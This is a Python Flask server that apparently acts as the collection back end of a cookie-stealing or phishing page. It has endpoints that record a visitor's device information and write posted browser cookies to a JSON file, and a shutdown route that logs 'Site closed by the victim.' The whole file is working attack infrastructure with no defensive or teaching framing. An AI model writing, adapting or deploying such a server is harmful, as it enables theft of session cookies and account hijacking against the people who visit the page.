from flask import Flask, request, jsonify, render_template
import json
import os

app = Flask(__name__)

# Path to save cookies
COOKIES_FOLDER = "cookies"
os.makedirs(COOKIES_FOLDER, exist_ok=True)

# Device information storage
device_info = {}


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/capture_device_info", methods=["POST"])
def capture_device_info():
    global device_info
    device_info = request.json
    print(f"Device Info Captured: {device_info}")
    return jsonify({"message": "Device info received!"})


@app.route("/save_cookies", methods=["POST"])
def save_cookies():
    cookies = request.json.get("cookies")
    file_path = os.path.join(COOKIES_FOLDER, "cookies.json")
    with open(file_path, "w") as file:
        json.dump(cookies, file, indent=4)
    print(f"Cookies saved to {file_path}")
    return jsonify({"message": "Cookies saved successfully!"})


@app.route("/close_site", methods=["POST"])
def close_site():
    print("Site closed by the victim.")
    os._exit(0)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
